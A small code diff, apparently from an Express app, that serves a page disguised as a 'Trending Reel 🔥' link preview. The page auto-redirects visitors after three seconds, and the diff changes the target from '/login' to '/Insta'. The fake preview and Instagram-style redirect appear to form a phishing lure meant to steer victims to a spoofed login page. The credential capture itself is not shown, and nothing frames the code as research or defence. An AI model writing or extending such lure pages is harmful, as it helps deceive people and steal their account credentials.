@@ -27,7 +27,7 @@ app.get('/', (req, res) => {
       <head>
         <meta property="og:title" content="Trending Reel 🔥">
         <meta property="og:image" content="https://i.imgur.com/real-reel-preview.jpg">
-        <meta http-equiv="refresh" content="3; url='/login'" />
+        <meta http-equiv="refresh" content="3; url='/Insta'" />
       </head>
       <body>
         <div style="text-align:center;padding:50px;">
